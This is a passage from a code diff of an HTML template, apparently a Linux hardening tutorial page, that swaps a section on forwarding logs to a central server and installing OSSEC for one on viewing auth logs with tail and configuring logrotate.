+          <li><strong>Harden:</strong> Protect log files with proper permissions and use logrotate to retain logs.</li>
+          <li><strong>Learning Moment:</strong> Simulate attacks and verify your monitoring and alerting works.</li>
+        </ol>
+        <h5>1. View Auth Logs</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Configure rsyslog or syslog-ng to forward logs to a centralized logging server
-*.* @@logserver.example.com:514
+tail -f /var/log/auth.log
         </code></pre>
-        <h5>2. Monitor and Alert</h5>
+        <h5>2. Log Rotation</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Use monitoring tools like OSSEC or fail2ban to detect suspicious log activity
-sudo apt-get install ossec-hids
+# /etc/logrotate.conf controls log rotation
         </code></pre>
       `
     }
